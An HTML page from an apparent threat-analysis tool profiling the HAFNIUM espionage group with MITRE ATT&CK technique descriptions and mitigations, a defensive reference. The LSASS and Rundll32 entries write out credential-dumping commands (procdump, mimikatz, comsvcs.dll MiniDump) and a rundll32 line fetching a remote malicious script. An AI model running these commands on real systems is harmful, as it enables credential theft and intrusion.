@@ -1,0 +1,356 @@
+
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" href="RAPTOR.css">
+    <link rel="shortcut icon" href="./images/favicon.ico" type="image/x-icon">
+    <title>HAFNIUM</title>
+  </head>
+  <body>
+    <div class="container">
+      <div id="navmenu">
+        <ul>
+          <li><a href="index.html">Print All</a></li>
+          <li><a href="index.html">About</a></li>
+          <li class="left"><a href="index.html"><img src="./images/raptor.png" id="logo"></a></li>
+        </ul>
+      </div>
+      <div id="groupmenu">
+        <h2>90+%</h2>
+          <p><a href="G0130.html">Ajax Security Team</a></p>
+        <h2>80% - 89%</h2>
+          <p><a href="G0032.html">Lazarus Group</a></p>
+        <h2>70% - 79%</h2>
+          <p><a href="G0035.html">Dragonfly</a></p>
+        <h2>60% - 69%</h2>
+          <p><a href="G0006.html">APT1</a></p>
+          <p><a href="G0080.html">Cobalt Group</a></p>
+        <h2>50% - 59%</h2>
+          <p><a href="G0100.html">Inception</a></p>
+          <p><a href="G0125.html">HAFNIUM</a></p>
+      </div>
+      <div id="groupinfo">
+        <h1>HAFNIUM</h1>
+          <p>[<a href="https://attack.mitre.org/groups/G0125">HAFNIUM</a>] is a likely state-sponsored cyber espionage group operating out of China that has been active since at least January 2021. [<a href="https://attack.mitre.org/groups/G0125">HAFNIUM</a>] primarily targets entities in the US across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.</p>
+        <h2>Associated Groups</h2>
+          <p>Operation Exchange Marauder</p>
+        <button id ="button1" class="collapsible">Software</button>
+          <div class="content">
+            <button id="button2" class="collapsible">ASPXSpy</button>
+              <div class="content">
+                <p>[<a href="https://attack.mitre.org/software/S0073">ASPXSpy</a>] is a Web shell. It has been modified by [<a href="https://attack.mitre.org/groups/G0027">Threat Group-3390</a>] actors to create the ASPXTool version. </p>
+              </div>
+            <button id="button2" class="collapsible">China Chopper</button>
+              <div class="content">
+                <p>[<a href="https://attack.mitre.org/software/S0020">China Chopper</a>] is a [<a href="https://attack.mitre.org/techniques/T1505/003">Web Shell</a>] hosted on Web servers to provide access back into an enterprise network that does not rely on an infected system calling back to a remote command and control server.  It has been used by several threat groups.  </p>
+              </div>
+            <button id="button2" class="collapsible">PsExec</button>
+              <div class="content">
+                <p>[<a href="https://attack.mitre.org/software/S0029">PsExec</a>] is a free Microsoft tool that can be used to execute a program on another computer. It is used by IT administrators and attackers.  </p>
+              </div>
+          </div>
+        <button id ="button1" class="collapsible">Techniques</button>
+          <div class="content">
+          <button id="button2" class="collapsible">Archive Collected Data: Archive via Utility</button>
+            <div class="content">
+              <p>An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities. Many utilities exist that can archive data, including 7-Zip, WinRAR, and WinZip. Most utilities include functionality to encrypt and/or compress data.
+
+Some 3rd party utilities may be preinstalled, such as `tar` on Linux and macOS or `zip` on Windows systems.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Audit - Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Gather Victim Host Information: Client Configurations</button>
+            <div class="content">
+              <p>Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.
+
+Adversaries may gather this information in various ways, such as direct collection actions via [<a href="https://attack.mitre.org/techniques/T1595">Active Scanning</a>] (ex: listening ports, server banners, user agent strings) or [<a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a>]. Adversaries may also compromise sites then include malicious content designed to collect host information from visitors. Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [<a href="https://attack.mitre.org/techniques/T1593">Search Open Websites/Domains</a>] or [<a href="https://attack.mitre.org/techniques/T1596">Search Open Technical Databases</a>]), establishing operational resources (ex: [<a href="https://attack.mitre.org/techniques/T1587">Develop Capabilities</a>] or [<a href="https://attack.mitre.org/techniques/T1588">Obtain Capabilities</a>]), and/or initial access (ex: [<a href="https://attack.mitre.org/techniques/T1195">Supply Chain Compromise</a>] or [<a href="https://attack.mitre.org/techniques/T1133">External Remote Services</a>]).</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Create Account: Domain Account</button>
+            <div class="content">
+              <p>Adversaries may create a domain account to maintain access to victim systems. Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover user, administrator, and service accounts. With a sufficient level of access, the <code>net user /add /domain</code> command can be used to create a domain account.
+
+Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</p>
+                  <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p>
+                  <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
+                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Gather Victim Identity Information: Email Addresses</button>
+            <div class="content">
+              <p>Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.
+
+Adversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [<a href="https://attack.mitre.org/techniques/T1593/001">Social Media</a>] or [<a href="https://attack.mitre.org/techniques/T1594">Search Victim-Owned Websites</a>]). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [<a href="https://attack.mitre.org/techniques/T1593">Search Open Websites/Domains</a>] or [<a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a>]), establishing operational resources (ex: [<a href="https://attack.mitre.org/techniques/T1586/002">Email Accounts</a>]), and/or initial access (ex: [<a href="https://attack.mitre.org/techniques/T1566">Phishing</a>]).</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Exfiltration Over Web Service: Exfiltration to Cloud Storage</button>
+            <div class="content">
+              <p>Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.
+
+Examples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service. </p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Restrict Web-Based Content - Restrict use of certain websites, block downloads/attachments, block Javascript, restrict browser extensions, etc.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Exploitation for Client Execution</button>
+            <div class="content">
+              <p>Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility.
+
+Several types exist:
+
+### Browser-based Exploitation
+
+Web browsers are a common target through [<a href="https://attack.mitre.org/techniques/T1189">Drive-by Compromise</a>] and [<a href="https://attack.mitre.org/techniques/T1566/002">Spearphishing Link</a>]. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.
+
+### Office Applications
+
+Common office and productivity applications such as Microsoft Office are also targeted through [<a href="https://attack.mitre.org/techniques/T1566">Phishing</a>]. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.
+
+### Common Third-party Applications
+
+Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Application Isolation and Sandboxing - Restrict execution of code to a virtual environment on or in transit to an endpoint system.</p>
+                  <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Gather Victim Network Information</button>
+            <div class="content">
+              <p>Adversaries may gather information about the victim's networks that can be used during targeting. Information about networks may include a variety of details, including administrative data (ex: IP ranges, domain names, etc.) as well as specifics regarding its topology and operations.
+
+Adversaries may gather this information in various ways, such as direct collection actions via [<a href="https://attack.mitre.org/techniques/T1595">Active Scanning</a>] or [<a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a>]. Information about networks may also be exposed to adversaries via online or other accessible data sets (ex: [<a href="https://attack.mitre.org/techniques/T1596">Search Open Technical Databases</a>]). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [<a href="https://attack.mitre.org/techniques/T1595">Active Scanning</a>] or [<a href="https://attack.mitre.org/techniques/T1593">Search Open Websites/Domains</a>]), establishing operational resources (ex: [<a href="https://attack.mitre.org/techniques/T1583">Acquire Infrastructure</a>] or [<a href="https://attack.mitre.org/techniques/T1584">Compromise Infrastructure</a>]), and/or initial access (ex: [<a href="https://attack.mitre.org/techniques/T1199">Trusted Relationship</a>]).</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Gather Victim Network Information: IP Addresses</button>
+            <div class="content">
+              <p>Adversaries may gather the victim's IP addresses that can be used during targeting. Public IP addresses may be allocated to organizations by block, or a range of sequential addresses. Information about assigned IP addresses may include a variety of details, such as which IP addresses are in use. IP addresses may also enable an adversary to derive other details about a victim, such as organizational size, physical location(s), Internet service provider, and or where/how their publicly-facing infrastructure is hosted.
+
+Adversaries may gather this information in various ways, such as direct collection actions via [<a href="https://attack.mitre.org/techniques/T1595">Active Scanning</a>] or [<a href="https://attack.mitre.org/techniques/T1598">Phishing for Information</a>]. Information about assigned IP addresses may also be exposed to adversaries via online or other accessible data sets (ex: [<a href="https://attack.mitre.org/techniques/T1596">Search Open Technical Databases</a>]). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [<a href="https://attack.mitre.org/techniques/T1595">Active Scanning</a>] or [<a href="https://attack.mitre.org/techniques/T1593">Search Open Websites/Domains</a>]), establishing operational resources (ex: [<a href="https://attack.mitre.org/techniques/T1583">Acquire Infrastructure</a>] or [<a href="https://attack.mitre.org/techniques/T1584">Compromise Infrastructure</a>]), and/or initial access (ex: [<a href="https://attack.mitre.org/techniques/T1133">External Remote Services</a>]).</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Ingress Tool Transfer</button>
+            <div class="content">
+              <p>Adversaries may transfer tools or other files from an external system into a compromised environment. Files may be copied from an external adversary controlled system through the command and control channel to bring tools into the victim network or through alternate protocols with another tool such as FTP. Files can also be copied over on Mac and Linux with native tools like scp, rsync, and sftp.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">OS Credential Dumping: LSASS Memory</button>
+            <div class="content">
+              <p>Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [<a href="https://attack.mitre.org/tactics/TA0008">Lateral Movement</a>] using [<a href="https://attack.mitre.org/techniques/T1550">Use Alternate Authentication Material</a>].
+
+As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system.
+
+For example, on the target host use procdump:
+
+* <code>procdump -ma lsass.exe lsass_dump</code>
+
+Locally, mimikatz can be run using:
+
+* <code>sekurlsa::Minidump lsassdump.dmp</code>
+* <code>sekurlsa::logonPasswords</code>
+
+Built-in Windows tools such as comsvcs.dll can also be used:
+
+* <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID  lsass.dmp full</code>
+
+
+Windows Security Support Provider (SSP) DLLs are loaded into LSSAS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.
+
+The following SSPs can be used to access credentials:
+
+* Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package.
+* Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.
+* Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later.
+* CredSSP:  Provides SSO and Network Level Authentication for Remote Desktop Services.
+</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Behavior Prevention on Endpoint - Use capabilities to prevent suspicious behavior patterns from occurring on endpoint systems. This could include suspicious process, file, API call, etc. behavior.</p>
+                  <p>Credential Access Protection - Use capabilities to prevent successful credential access by adversaries; including blocking forms of credential dumping.</p>
+                  <p>Operating System Configuration - Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.</p>
+                  <p>Password Policies - Set and enforce secure password policies for accounts.</p>
+                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                  <p>Privileged Process Integrity - Protect processes with high privileges that can be used to interact with critical system components through use of protected process light, anti-process injection defenses, or other process integrity enforcement measures.</p>
+                  <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Valid Accounts: Local Accounts</button>
+            <div class="content">
+              <p>Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.
+
+Local Accounts may also be abused to elevate privileges and harvest credentials through [<a href="https://attack.mitre.org/techniques/T1003">OS Credential Dumping</a>]. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement. </p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Password Policies - Set and enforce secure password policies for accounts.</p>
+                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">OS Credential Dumping: NTDS</button>
+            <div class="content">
+              <p>Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.
+
+In addition to looking for NTDS files on active Domain Controllers, attackers may search for backups that contain the same or similar information.
+
+The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes.
+
+* Volume Shadow Copy
+* secretsdump.py
+* Using the in-built Windows tool, ntdsutil.exe
+* Invoke-NinjaCopy
+</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Encrypt Sensitive Information - Protect sensitive information with strong encryption.</p>
+                  <p>Password Policies - Set and enforce secure password policies for accounts.</p>
+                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                  <p>User Training - Train users to be aware of access or manipulation attempts by an adversary to reduce the risk of successful spearphishing, social engineering, and other techniques that involve user interaction.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Non-Application Layer Protocol</button>
+            <div class="content">
+              <p>Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).
+
+ICMP communication between hosts is one example.
+ Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts;  however, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Filter Network Traffic - Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.</p>
+                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                  <p>Network Segmentation - Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Command and Scripting Interpreter: PowerShell</button>
+            <div class="content">
+              <p>Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system.  Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples include the <code>Start-Process</code> cmdlet which can be used to run an executable and the <code>Invoke-Command</code> cmdlet which runs a command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).
+
+PowerShell may also be used to download and run executables from the Internet, which can be executed from disk or in memory without touching disk.
+
+A number of PowerShell-based offensive testing tools are available, including [<a href="https://attack.mitre.org/software/S0363">Empire</a>],  [<a href="https://attack.mitre.org/software/S0194">PowerSploit</a>], [<a href="https://attack.mitre.org/software/S0378">PoshC2</a>], and PSAttack.
+
+PowerShell commands/scripts can also be executed without directly invoking the <code>powershell.exe</code> binary through interfaces to PowerShell's underlying <code>System.Management.Automation</code> assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI). </p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Antivirus/Antimalware - Use signatures or heuristics to detect malicious software.</p>
+                  <p>Code Signing - Enforce binary and application integrity with digital signature verification to prevent untrusted code from executing.</p>
+                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                  <p>Execution Prevention - Block execution of code on a system through application control, and/or script blocking.</p>
+                  <p>Privileged Account Management - Manage the creation, modification, use, and permissions associated to privileged accounts, including SYSTEM and root.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Email Collection: Remote Email Collection</button>
+            <div class="content">
+              <p>Adversaries may target an Exchange server, Office 365, or Google Workspace to collect sensitive information. Adversaries may leverage a user's credentials and interact directly with the Exchange server to acquire information from within a network. Adversaries may also access externally facing Exchange services, Office 365, or Google Workspace to access email using credentials or access tokens. Tools such as [<a href="https://attack.mitre.org/software/S0413">MailSniper</a>] can be used to automate searches for specific keywords.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Encrypt Sensitive Information - Protect sensitive information with strong encryption.</p>
+                  <p>Multi-factor Authentication - Use two or more pieces of evidence to authenticate to a system; such as username and password in addition to a token from a physical smart card or token generator.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Signed Binary Proxy Execution: Rundll32</button>
+            <div class="content">
+              <p>Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [<a href="https://attack.mitre.org/techniques/T1129">Shared Modules</a>]), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).
+
+Rundll32.exe can also be used to execute [<a href="https://attack.mitre.org/techniques/T1218/002">Control Panel</a>] Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. 
+
+Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"</code>  This behavior has been seen used by malware such as Poweliks. 
+
+Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Exploit Protection - Use capabilities to detect and block conditions that may lead to or be indicative of a software exploit occurring.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Data Encoding: Standard Encoding</button>
+            <div class="content">
+              <p>Adversaries may encode data with a standard data encoding system to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system that adheres to existing protocol specifications. Common data encoding schemes include ASCII, Unicode, hexadecimal, Base64, and MIME.  Some data encoding systems may also result in data compression, such as gzip.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Acquire Infrastructure: Virtual Private Server</button>
+            <div class="content">
+              <p>Adversaries may rent Virtual Private Servers (VPSs) that can be used during targeting. There exist a variety of cloud service providers that will sell virtual machines/containers as a service. By utilizing a VPS, adversaries can make it difficult to physically tie back operations to them. The use of cloud infrastructure can also make it easier for adversaries to rapidly provision, modify, and shut down their infrastructure.
+
+Acquiring a VPS for use in later stages of the adversary lifecycle, such as Command and Control, can allow adversaries to benefit from the ubiquity and trust associated with higher reputation cloud service providers. Adversaries may also acquire infrastructure from VPS service providers that are known for renting VPSs with minimal registration information, allowing for more anonymous acquisitions of infrastructure.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Application Layer Protocol: Web Protocols</button>
+            <div class="content">
+              <p>Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. 
+
+Protocols such as HTTP and HTTPS that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. </p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Network Intrusion Prevention - Use intrusion detection signatures to block traffic at network boundaries.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Acquire Infrastructure: Web Services</button>
+            <div class="content">
+              <p>Adversaries may register for web services that can be used during targeting. A variety of popular websites exist for adversaries to register for a web-based service that can be abused during later stages of the adversary lifecycle, such as during Command and Control ([<a href="https://attack.mitre.org/techniques/T1102">Web Service</a>]) or [<a href="https://attack.mitre.org/techniques/T1567">Exfiltration Over Web Service</a>]. Using common services, such as those offered by Google or Twitter, makes it easier for adversaries to hide in expected noise. By utilizing a web service, adversaries can make it difficult to physically tie back operations to them.</p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Pre-compromise - This category is used for any applicable mitigation activities that apply to techniques occurring before an adversary gains Initial Access, such as Reconnaissance and Resource Development techniques.</p>
+                </div>
+            </div>
+          <button id="button2" class="collapsible">Server Software Component: Web Shell</button>
+            <div class="content">
+              <p>Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to use the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.
+
+In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (ex: [<a href="https://attack.mitre.org/software/S0020">China Chopper</a>] Web shell client). </p>
+              <button id="button3" class="collapsible">Mitigations</button>
+                <div class="content">
+                  <p>Disable or Remove Feature or Program - Remove or deny access to unnecessary and potentially vulnerable software to prevent abuse by adversaries.</p>
+                  <p>User Account Management - Manage the creation, modification, use, and permissions associated to user accounts.</p>
+                </div>
+            </div>
+          </div>
+      </div>
+      <div id="footer">
+        <ul>
+          <li><a href="https://github.com/redbeardmeric/APTAnalyzer"><img src="./images/Github.png"></a></li>
+          <li><a href="https://attack.mitre.org/"><img src="./images/Attck.png"></a></li>
+        </ul>
+      </div>
+    </div>
+    <script>
+      var coll = document.getElementsByClassName("collapsible");
+      var i;
+      for (i = 0; i < coll.length; i++) {
+        coll[i].addEventListener("click", function(){
+          this.classList.toggle("active");
+          var content = this.nextElementSibling;
+          if (content.style.maxHeight){
+            content.style.maxHeight = null;
+          } else {
+            content.style.maxHeight = 1000000 + "px";
+          } 
+        });
+      }
+    </script>
+  </body>
+</html>
